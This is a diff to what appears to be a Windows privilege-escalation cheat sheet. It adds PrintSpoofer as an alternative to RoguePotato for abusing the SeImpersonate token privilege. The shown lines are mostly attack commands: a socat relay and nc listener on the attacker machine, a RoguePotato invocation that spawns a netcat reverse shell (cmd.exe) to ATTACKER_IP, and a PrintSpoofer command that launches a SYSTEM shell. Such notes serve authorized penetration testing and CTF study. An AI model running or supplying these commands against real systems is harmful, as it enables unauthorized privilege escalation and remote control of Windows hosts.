@@ -265,12 +265,16 @@ Usual files that may contain credentials:
     - Start > Lock Screen > Ease of Access
   
 # SeImpersonate / SeAssignPrimaryToken
-  - Rougepotato: https://github.com/antonioCoco/RoguePotato
+  - Rougepotato: https://github.com/antonioCoco/RoguePotato 
+  `Only works if DCOM is enabled on the target Machine, use "PrintSpoofer" as alternative https://github.com/itm4n/PrintSpoofer`
 - *on attacker machine*
   - sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
   - nc -lnvp 4444
 - *on target machine*
   - RoguePotato.exe -r ATTACKER_IP -e "nc64 -e cmd.exe ATTACKER_IP 4448" -l 9999
+  
+  - PrintSpoofer: https://github.com/dievus/printspoofer / https://github.com/itm4n/PrintSpoofer
+ - PrintSpoofer.exe -i -c cmd
   
 # Tools of the trade
   - WinPEAS https://github.com/carlospolop/PEASS-ng `uncover privilege escalation paths`
